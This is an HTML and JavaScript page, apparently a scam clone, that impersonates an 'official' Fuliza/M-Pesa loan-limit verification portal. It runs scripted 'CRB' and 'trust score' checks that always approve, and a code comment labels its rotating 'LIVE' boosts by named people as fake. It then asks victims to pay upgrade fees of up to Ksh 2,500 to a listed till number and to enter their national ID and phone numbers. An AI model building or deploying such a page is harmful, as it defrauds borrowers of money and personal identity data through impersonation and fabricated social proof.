<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fuliza Boost Clone</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f4f7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }.card {
  width: 320px;
  background: #fff;
  border-radius: 20px;
  padding: 20px;
  text-align: center;
  box-shadow: 0 10px 25px rgba(0,0,0,0.1);
}

.title {
  font-size: 22px;
  font-weight: bold;
  margin-bottom: 5px;
}

.subtitle {
  color: green;
  font-size: 12px;
  margin-bottom: 15px;
}

input {
  width: 100%;
  padding: 12px;
  border-radius: 10px;
  border: 1px solid #ddd;
  margin-bottom: 15px;
  font-size: 14px;
}

button {
  width: 100%;
  padding: 14px;
  border-radius: 12px;
  border: none;
  background: #16a34a;
  color: #fff;
  font-size: 16px;
  cursor: pointer;
}

.loader {
  margin: 20px auto;
  width: 40px;
  height: 40px;
  border: 4px solid #e5e7eb;
  border-top: 4px solid green;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  100% { transform: rotate(360deg); }
}

.hidden { display: none; }

.success {
  color: green;
  font-weight: bold;
  font-size: 18px;
}

.limits {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
  margin-top: 20px;
}

.limit-box {
  background: #f9fafb;
  padding: 15px;
  border-radius: 12px;
  box-shadow: 0 4px 10px rgba(0,0,0,0.05);
}

.limit-box strong {
  color: green;
}

.live {
  background: #eef6f0;
  border-radius: 12px;
  padding: 10px;
  font-size: 12px;
  margin-bottom: 15px;
  text-align: left;
}

.live span {
  color: green;
  font-weight: bold;
}

  </style>
</head>
<body><div class="card" id="step1">
  <div class="title">Fuliza Plus+</div>
  <div class="subtitle">OFFICIAL VERIFICATION PORTAL</div>
  <input type="text" id="phone" placeholder="Enter M-Pesa Number">
  <button onclick="startProcess()">Check My Eligibility</button>
</div><div class="card hidden" id="loading">
  <div class="loader"></div>
  <div id="statusText">Connecting...</div>
</div><div class="card hidden" id="success">
  <div class="success">Congratulations!</div>
  <p id="resultText"></p>
  <button onclick="showLimits()">Proceed to Upgrade Limit</button>
</div><div class="card hidden" id="limits">
  <div class="live" id="liveBox">Loading activity...</div>
  <div class="title">Select Your New Limit</div>
  <div class="limits">
    <div class="limit-box"><strong>Ksh 3,000</strong><br>Fee: 250</div>
    <div class="limit-box"><strong>Ksh 5,000</strong><br>Fee: 293</div>
    <div class="limit-box"><strong>Ksh 10,000</strong><br>Fee: 500</div>
    <div class="limit-box"><strong>Ksh 25,000</strong><br>Fee: 1220</div>
    <div class="limit-box"><strong>Ksh 45,000</strong><br>Fee: 2000</div>
    <div class="limit-box"><strong>Ksh 70,000</strong><br>Fee: 2500</div>
  </div>
</div><script>
  function startProcess() {
    const phone = document.getElementById('phone').value;
    if (!phone) {
      alert('Enter phone number');
      return;
    }

    document.getElementById('step1').classList.add('hidden');
    document.getElementById('loading').classList.remove('hidden');

    const steps = [
      "Connecting...",
      "Verifying CRB Status...",
      "Finalizing Trust Score...",
      "Checking Usage History..."
    ];

    let i = 0;
    const interval = setInterval(() => {
      document.getElementById('statusText').innerText = steps[i];
      i++;
      if (i >= steps.length) {
        clearInterval(interval);
        showSuccess(phone);
      }
    }, 1500);
  }

  function showSuccess(phone) {
    document.getElementById('loading').classList.add('hidden');
    document.getElementById('success').classList.remove('hidden');
    document.getElementById('resultText').innerText = phone + " is eligible for a boost.";
  }

  function showLimits() {
    document.getElementById('success').classList.add('hidden');
    document.getElementById('limits').classList.remove('hidden');
  }

  // Fake live activity generator
  const names = ["Faith W.", "Brian K.", "Alice M.", "Kevin J.", "Diana N."];
  const amounts = [3000, 5000, 7500, 10000, 25000, 45000];

  function updateLiveActivity() {
    const name = names[Math.floor(Math.random() * names.length)];
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    document.getElementById('liveBox').innerHTML =
      `🔄 <b>LIVE:</b> ${name} boosted to <span>Ksh ${amount.toLocaleString()}</span> just now`;
  }

  setInterval(updateLiveActivity, 3000);
  updateLiveActivity();



// Show upgrade form when limit is clicked
const limitButtons = document.querySelectorAll('.limit');
limitButtons.forEach(btn => {
  btn.addEventListener('click', () => {
    document.getElementById('limits').classList.add('hidden');
    document.getElementById('upgradeForm').classList.remove('hidden');
  });
});

function submitUpgrade() {
  const id = document.getElementById('idNumber').value;
  const phone = document.getElementById('phoneNumber').value;

  if (!id || !phone) {
    alert('Please fill all fields');
    return;
  }

  alert('Upgrade request submitted successfully!');
}

</script><!-- Upgrade Form --><div class="card hidden" id="upgradeForm">
  <h3>Complete Upgrade</h3>
  <p style="margin-bottom:10px;">Pay via Till Number: <strong>6363781</strong></p>
  <input type="text" id="idNumber" placeholder="Enter ID Number" />
  <input type="text" id="phoneNumber" placeholder="Enter Phone Number" />
  <button onclick="submitUpgrade()">Submit</button>
</div></body>
</html>
